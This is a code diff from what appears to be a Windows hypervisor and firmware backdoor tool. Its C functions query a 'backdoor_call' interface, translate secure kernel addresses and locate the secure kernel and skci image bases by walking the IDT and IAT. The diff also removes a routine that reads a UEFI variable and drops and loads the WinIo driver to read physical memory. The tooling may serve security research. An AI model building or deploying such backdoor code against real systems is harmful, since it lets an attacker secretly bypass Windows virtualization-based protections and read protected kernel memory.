-        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
+        bd_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
         return -1;
     }    
 
     for (int i = SK_INFO_TIMEOUT; i > 0; i -= 1)
     {
-        dbg_printf("\r> %d   ", i);
+        bd_printf("\r> %d   ", i);
 
-        Sleep(1000);
+        bd_sleep(1000);
     }
 
-    dbg_printf("\r");
+    bd_printf("\r");
 
     // stop collecting secure kernel information
     ret = backdoor_call(HVBD_C_SK_GET_STOP, &arg0, &arg1, &arg2);
     if (ret != HVBD_E_SUCCESS)
     {
-        dbg_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
+        bd_printf(__FUNCTION__"() ERROR: backdoor returned error 0x%llx\n", ret);
         return -1;
     }    
 
-    dbg_printf("[+] Reading collected data from 0x%llx...\n", arg0);
+    bd_printf("[+] Reading collected data from 0x%llx...\n", arg0);
 
     if (backdoor_virt_read(arg0, sk_info, sizeof(SK_INFO) * SK_MAX_COUNT) != 0)
     {
@@ -1417,6 +1435,27 @@ int backdoor_sk_info(SK_INFO *sk_info, uint64_t *call_count)
     if (call_count)
     {
         *call_count = arg2;
+    }
+
+    return 0;
+}
+//--------------------------------------------------------------------------------------
+int backdoor_sk_info_addr(uint64_t *addr)
+{
+    uint64_t arg0 = 0;
+    uint64_t arg1 = 0;
+    uint64_t arg2 = 0;
+
+    // get HVBD_DATA::SkInfo address
+    uint64_t ret = backdoor_call(HVBD_C_SK_GET_STOP, &arg0, &arg1, &arg2);
+    if (ret != HVBD_E_SUCCESS)
+    {
+        return -1;
+    }
+
+    if (addr)
+    {
+        *addr = arg0;
     }
 
     return 0;
@@ -1440,7 +1479,7 @@ int backdoor_sk_base(SK_INFO *sk_info, uint64_t *sk_addr, uint64_t *skci_addr)
     // get secure kernel IDT physical address
     if (backdoor_virt_translate(idt_addr_virt, &idt_addr_phys, pml4_addr, ept_addr) != 0)
     {
-        dbg_printf(__FUNCTION__"() ERROR: unable to get IDT physical address\n");
+        bd_printf(__FUNCTION__"() ERROR: unable to get IDT physical address\n");
         goto _end;
     }
 
@@ -1457,7 +1496,7 @@ int backdoor_sk_base(SK_INFO *sk_info, uint64_t *sk_addr, uint64_t *skci_addr)
     uint64_t vect_addr_virt = ((uint64_t)idt_entry.offset32 << 32) |
                               ((uint64_t)idt_entry.high_offset << 16) | idt_entry.low_offset;
 
-    dbg_printf("[+] Secure kernel IDT vector #0 is at 0x%llx\n", vect_addr_virt);
+    bd_printf("[+] Secure kernel IDT vector #0 is at 0x%llx\n", vect_addr_virt);
 
     vect_addr_virt &= ~(PAGE_SIZE - 1);
 
@@ -1470,7 +1509,7 @@ int backdoor_sk_base(SK_INFO *sk_info, uint64_t *sk_addr, uint64_t *skci_addr)
         // get IDT vector physical address
         if (backdoor_virt_translate(vect_addr_virt, &vect_addr_phys, pml4_addr, ept_addr) != 0)
         {
-            dbg_printf(__FUNCTION__"() ERROR: unable to get secure kernel image physical address\n");
+            bd_printf(__FUNCTION__"() ERROR: unable to get secure kernel image physical address\n");
             goto _end;
         }
 
@@ -1499,13 +1538,13 @@ int backdoor_sk_base(SK_INFO *sk_info, uint64_t *sk_addr, uint64_t *skci_addr)
 
     if (addr_virt == 0)
     {
-        dbg_printf(__FUNCTION__"() ERROR: unable to find secure kernel image base\n");
+        bd_printf(__FUNCTION__"() ERROR: unable to find secure kernel image base\n");
         goto _end;
     }
 
     uint64_t iat_entry_virt = 0, iat_entry_phys = 0;
 
-    uint8_t *buff = (uint8_t *)M_ALLOC(PAGE_SIZE);
+    uint8_t *buff = (uint8_t *)bd_alloc(PAGE_SIZE);
     if (buff)
     {
         // read secure kernel image headers
@@ -1532,7 +1571,7 @@ int backdoor_sk_base(SK_INFO *sk_info, uint64_t *sk_addr, uint64_t *skci_addr)
                     }
                     else
                     {
-                        dbg_printf(__FUNCTION__"() ERROR: unable to get secure kernel image imports physical address\n");
+                        bd_printf(__FUNCTION__"() ERROR: unable to get secure kernel image imports physical address\n");
                     }
 
                     if (imp.FirstThunk != 0)
@@ -1547,27 +1586,27 @@ int backdoor_sk_base(SK_INFO *sk_info, uint64_t *sk_addr, uint64_t *skci_addr)
                         }
                         else
                         {
-                            dbg_printf(__FUNCTION__"() ERROR: unable to get secure kernel image IAT physical address\n");
+                            bd_printf(__FUNCTION__"() ERROR: unable to get secure kernel image IAT physical address\n");
                         }
                     }
                 }
                 else
                 {
-                    dbg_printf(__FUNCTION__"() ERROR: secure kernel image imports not found\n");
+                    bd_printf(__FUNCTION__"() ERROR: secure kernel image imports not found\n");
                 }                
             }            
             else
             {
-                dbg_printf(__FUNCTION__"() ERROR: bad secure kernel image header\n");
+                bd_printf(__FUNCTION__"() ERROR: bad secure kernel image header\n");
             }
         }        
 
-        M_FREE(buff);
+        bd_free(buff);
     }
 
     if (iat_entry_virt == 0)
     {
-        dbg_printf(__FUNCTION__"() ERROR: unable to find skci image pointer\n");
+        bd_printf(__FUNCTION__"() ERROR: unable to find skci image pointer\n");
         goto _end;
     }
 
@@ -1581,7 +1620,7 @@ int backdoor_sk_base(SK_INFO *sk_info, uint64_t *sk_addr, uint64_t *skci_addr)
         // get IDT vector physical address
         if (backdoor_virt_translate(iat_entry_virt, &iat_entry_phys, pml4_addr, ept_addr) != 0)
         {
-            dbg_printf(__FUNCTION__"() ERROR: unable to get skci image physical address\n");
+            bd_printf(__FUNCTION__"() ERROR: unable to get skci image physical address\n");
             goto _end;
         }
 
@@ -1606,140 +1645,11 @@ int backdoor_sk_base(SK_INFO *sk_info, uint64_t *sk_addr, uint64_t *skci_addr)
         iat_entry_virt -= PAGE_SIZE;
     }
 
-    dbg_printf(__FUNCTION__"() ERROR: unable to find skci image base\n");
+    bd_printf(__FUNCTION__"() ERROR: unable to find skci image base\n");
 
 _end:
 
     m_quiet = false;
-
-    return ret;
-}
-//--------------------------------------------------------------------------------------
-int backdoor_read_debug_messages(void)
-{    
-    int ret = -1;    
-    wchar_t *var_name = BACKDOOR_VAR_NAME, var_guid[MAX_PATH];
-    GUID guid = BACKDOOR_VAR_GUID;
-    uint64_t address = 0;
-
-    wsprintfW(
-        var_guid, L"{%.8x-%.4x-%.4x-%.2x%.2x-%.2x%.2x%.2x%.2x%.2x%.2x}",
-        guid.Data1, guid.Data2, guid.Data3,
-        guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],
-        guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]
-    );
-
-    // obtain needed privileges
-    if (load_privileges(SE_SYSTEM_ENVIRONMENT_NAME) != 0)
-    {
-        dbg_printf("ERROR: Unable to obtain %s privilege\n", SE_SYSTEM_ENVIRONMENT_NAME);
-        return -1;
-    }
-
-    dbg_printf("[+] Reading firmware variable %ws %ws\n", var_name, var_guid);
-
-    // get debug messages buffer address
-    if (GetFirmwareEnvironmentVariableW(var_name, var_guid, (void *)&address, sizeof(address)) != sizeof(address))
-    {
-        dbg_printf("GetFirmwareEnvironmentVariable() ERROR %d\n", GetLastError());
-        dbg_printf("ERROR: Unable to get debug messages buffer address\n");
-        return -1;
-    }    
-
-    HANDLE fd = NULL;
-    char driver_path[MAX_PATH];
-    char *driver_name = WINIO_DRIVER_NAME, *device_path = WINIO_DEVICE_PATH;
-
-    GetSystemDirectory(driver_path, MAX_PATH);
-    strcat_s(driver_path, "\\drivers\\");
-    strcat_s(driver_path, driver_name);
-
-    // write driver into the system folder
-    if ((fd = CreateFile(driver_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
-    {
-        DWORD written = 0;
-
-        WriteFile(fd, winio_sys, sizeof(winio_sys), &written, NULL);
-        CloseHandle(fd);
-    }
-    else
-    {
-        dbg_printf("CreateFile() ERROR %d\n", GetLastError());
-        dbg_printf("ERROR: Unable to create driver file \"%s\"\n", driver_path);
-        return -1;
-    }
-
-    bool already_started = FALSE, stop = FALSE;
-
-    dbg_printf("[+] Loading WinIo driver...\n");
-
-    if ((fd = CreateFile(device_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL)) == INVALID_HANDLE_VALUE)
-    {
-        // create and start service
-        if (service_start(WINIO_SERVICE_NAME, driver_path, &already_started))
-        {
-            stop = !already_started;
-
-            dbg_printf("[+] WinIo driver was loaded\n");
-
-            // open driver device
-            fd = CreateFile(device_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-            if (fd == INVALID_HANDLE_VALUE)
-            {
-                dbg_printf("CreateFile() ERROR %d\n", GetLastError());
-                dbg_printf("ERROR: Unable to open \"%s\"\n", device_path);
-                goto _end;
-            }
-        }
-        else
-        {
-            dbg_printf("ERROR: Unable to load WinIo driver\n");
-            goto _end;
-        }
-    }    
-    else
-    {
-        dbg_printf("[+] WinIo driver is already loaded\n");
-    }
-
-    if (fd != INVALID_HANDLE_VALUE)
-    {   
-        char *buff = (char *)M_ALLOC(DEBUG_OUTPUT_SIZE);
-        if (buff)
-        {
-            memset(buff, 0, DEBUG_OUTPUT_SIZE);
-
-            dbg_printf("[+] Reading DXE driver debug messages from 0x%llx\n", address);
-
-            // read debug messages buffer 
-            if (winio_phys_mem_read(fd, address, DEBUG_OUTPUT_SIZE, buff) == 0)
-            {
-                // print debug messages to the screen
-                dbg_printf("\n%s\n", buff);
-
-                ret = 0;
-            }
-            else
-            {
-                dbg_printf("ERROR: Unable to read debug messages buffer\n");
-            }
-
-            M_FREE(buff);
-        }
-
-        CloseHandle(fd);
-    }
-
-_end:
-
-    if (stop)
-    {
-        // stop and delete service
-        service_stop(WINIO_SERVICE_NAME);
-        service_remove(WINIO_SERVICE_NAME);
-    }
-
-    DeleteFile(driver_path);
 
     return ret;
 }
